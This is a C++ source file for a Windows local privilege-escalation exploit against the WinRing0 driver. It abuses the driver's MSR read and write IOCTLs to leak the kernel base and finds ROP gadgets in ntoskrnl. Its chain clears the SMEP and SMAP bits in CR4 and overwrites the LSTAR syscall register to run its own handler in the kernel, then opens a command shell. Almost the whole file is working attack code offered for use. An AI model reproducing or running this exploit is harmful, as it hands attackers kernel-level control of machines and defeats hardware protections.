#include <windows.h>
#include <winnt.h>
#include <stdint.h>
#include <string.h>
#include <iostream>

using std::cout; using std::endl; using std::hex; using std::dec;

extern "C" void TriggerSyscall(PUINT64);
extern "C" void SyscallHandler();
extern "C" void TriggerSyscall_Return();

extern "C" uint64_t g_originalLSTAR = 0;
extern "C" uint64_t g_SystemProcessAddress = 0;
extern "C" uint64_t g_ExploitPid = 0;


#define READ_MSR_IOCTL 0x9c402084
#define WRITE_MSR_IOCTL 0x9c402088
#define MAP_MEM_IOCTL 0x9c406104
#define CR4_VALUE 0x0370678

#pragma pack(push, 1)
typedef struct _WRMSR_IN {
    uint32_t msrIndex;   // EAX
    uint32_t low32Bits;    // ECX
    uint32_t high32Bits;  // EDX
} WRMSR_IN;
#pragma pack(pop)
static_assert(sizeof(WRMSR_IN) == 12, "WRMSR_IN must be 12 bytes");

#define POP_RCX_RET_PATTERN        { 0x59, 0xC3 }
#define MOV_CR4_RCX_RET_PATTERN    { 0x0F, 0x22, 0xE1, 0xC3 }
#define SYSRET_PATTERN             { 0x48, 0x0F, 0x07 }

uint8_t pop_rcx_ret[] = POP_RCX_RET_PATTERN;
uint8_t mov_cr4_rcx_ret[] = MOV_CR4_RCX_RET_PATTERN;
uint8_t sysret[] = SYSRET_PATTERN;

HANDLE gDriver = INVALID_HANDLE_VALUE;

uint64_t read_msr(uint32_t msr_register)
{
    uint64_t buffer = 0;
    uint32_t* msr = (uint32_t*)&buffer;
    *msr = msr_register;

    DeviceIoControl(gDriver, READ_MSR_IOCTL, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL, NULL);

    return buffer;
}

uint64_t write_msr(uint32_t msr_register, uint64_t value)
{
    WRMSR_IN buffer = { 0 };

    buffer.msrIndex = msr_register;
    buffer.low32Bits = (uint32_t)(value & 0xffffffff);;
    buffer.high32Bits = (uint32_t)(value >> 32); ;

    DeviceIoControl(gDriver, WRITE_MSR_IOCTL, &buffer, sizeof(buffer), NULL, 0, NULL, NULL);

    return 0;
}

uint64_t find_byte_pattern_in_code_section(HMODULE hMod, const uint8_t* pattern, size_t len, uint64_t start_address)
{
    if (!hMod || !pattern || len == 0)
        return 0;

    uint8_t* base = (uint8_t*)hMod;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    IMAGE_SECTION_HEADER* section =
        IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++)
    {
        if (memcmp(section->Name, ".text", 5) != 0)
            continue;

        uintptr_t text_start = section->VirtualAddress;
        size_t text_size = section->Misc.VirtualSize;
        if (text_size == 0)
            text_size = section->SizeOfRawData;

        if (len > text_size)
            return 0;

        uintptr_t scan_start = start_address;
        if (scan_start < text_start)
            scan_start = text_start;

        uintptr_t text_end = text_start + text_size;

        for (uintptr_t off = scan_start; off <= text_end - len; off++)
        {
            if (memcmp(base + off, pattern, len) == 0)
                return off; // offset from module base
        }

        return 0;
    }

    return 0;
}


uint64_t find_byte_pattern(HMODULE hMod, const uint8_t* pattern, size_t len, uint64_t start_address)
{
    uint8_t* base = (uint8_t*)hMod;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

    size_t size = nt->OptionalHeader.SizeOfImage;

    for (size_t i = start_address; i <= size - len; i++)
    {
        if (memcmp(base + i, pattern, len) == 0)
            return i;
    }

    return 0;
}

uint64_t disclose_nt_base()
{
    uint64_t KiSystemCall64Shadow = read_msr(0x0c0000082);

    uint8_t pattern[] = { 0x0f, 0x01, 0xf8, 0x65, 0x48, 0x89, 0x24, 0x25 };
    HMODULE ntLocal = LoadLibrary(L"ntoskrnl.exe");

    BOOL found = 0;
    uint64_t start_address = 0;

    while (!found)
    {
        uint64_t offset = find_byte_pattern(ntLocal, pattern, 0x8, start_address);
        start_address = offset + 8;

        if (((KiSystemCall64Shadow - offset) & 0xfffff) == 0 || offset == 0)
        {
            found = 1;
            FreeLibrary(ntLocal);
            return KiSystemCall64Shadow - offset;
        }
    }

    FreeLibrary(ntLocal);

    // fallback tied to exact OS version
    return KiSystemCall64Shadow - 0x00ab71c0;
}

// Mimic the SystemBuffer1 structure the driver receives
struct SystemBuffer {
    int64_t PhysicalAddress;  // offset 0x0
    int64_t multiplier;       // offset 0x8  (buffer_1/SystemBuffer1[1])
    int32_t count;            // offset 0xc  (buffer_0xc)
};

int main()
{
	cout << "WinRing0 Exploit" << endl;
	cout << "----------------" << endl;

	gDriver =  CreateFileA("\\\\.\\WinRing0_1_2_0", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (gDriver == INVALID_HANDLE_VALUE)
    {
        cout << "[!] Unable to get a handle to the driver: " << GetLastError() << endl;
        return 1;
    } 
    else
    {
        cout << "[+] Driver handle: " << gDriver << endl;
	}

	uint64_t nt = disclose_nt_base();
     
	cout << "[+] ntoskrnl.exe base: " << hex << nt << dec << endl;

    
    // version agnostic rop discovery
    PUINT64 gadgets = (PUINT64)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UINT64) * 9);

    g_originalLSTAR = read_msr(0x0c0000082);

	cout << "[+] Original LSTAR: 0x" << hex << g_originalLSTAR << dec << endl;

    HMODULE ntLocal = LoadLibrary(L"ntoskrnl.exe");
    
    g_SystemProcessAddress = (uint64_t)GetProcAddress(ntLocal, "PsInitialSystemProcess");
    g_SystemProcessAddress = (g_SystemProcessAddress - (uint64_t)ntLocal) + nt;
    cout << "[+] System _eprocess Address: 0x" << hex << g_SystemProcessAddress << dec << endl;

	cout << "[+] Searching for ROP gadgets..." << endl;

    uint64_t pop_rcx = find_byte_pattern_in_code_section(ntLocal, pop_rcx_ret, sizeof(pop_rcx_ret), 0x0);
    uint64_t mov_cr4_rcx = find_byte_pattern_in_code_section(ntLocal, mov_cr4_rcx_ret, sizeof(mov_cr4_rcx_ret), 0x0);
    uint64_t sysret_gadget = find_byte_pattern_in_code_section(ntLocal, sysret, sizeof(sysret), 0x0);

    if (pop_rcx == 0)
    {
        cout << "[!] Failed to find pop rcx ; ret ; gadget" << endl;
        FreeLibrary(ntLocal);
        return -1;
    }

    cout << "[+] pop rcx ; ret ; 0x" << hex << pop_rcx + nt << dec << endl;

    
    if (mov_cr4_rcx == 0)
    {
        cout << "[!] Failed to find mov cr4, rcx ; ret ; gadget" << endl;
        FreeLibrary(ntLocal);
        return -1;
    }

    cout << "[+] mov cr4, rcx ; ret ; 0x" << hex << mov_cr4_rcx + nt << dec << endl;

    if (sysret_gadget == 0)
    {
        cout << "[!] Failed to find sysret ; gadget" << endl;
        FreeLibrary(ntLocal);
        return -1;
    }

    cout << "[+] sysret ; gadget ; 0x" << hex << sysret_gadget + nt << dec << endl;

	gadgets[0] = sysret_gadget + nt;                            // sysret
    gadgets[1] = (uint64_t)&TriggerSyscall_Return;              // end of function
    gadgets[2] = pop_rcx + nt;                                  // pop rcx ; ret
    gadgets[3] = mov_cr4_rcx + nt;                              // mov cr4, rcx ; ret
    gadgets[4] = CR4_VALUE;
	gadgets[5] = pop_rcx + nt;                                  // pop rcx ; ret
    gadgets[6] = (uint64_t)&SyscallHandler;
	gadgets[7] = mov_cr4_rcx + nt;                              // mov cr4, rcx ; ret
	gadgets[8] = (CR4_VALUE & ~(1ULL << 20)) & ~(1ULL << 21);   //smep and smap bits cleared

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    write_msr(0x0c0000082, nt + pop_rcx);

    TriggerSyscall(gadgets);

    // restore priority
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
    SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);

	cout << "[+] Returned to user-mode..." << endl;

	cout << "[+] Enjoy your new shell..." << endl;
    
    system("cmd.exe");

}


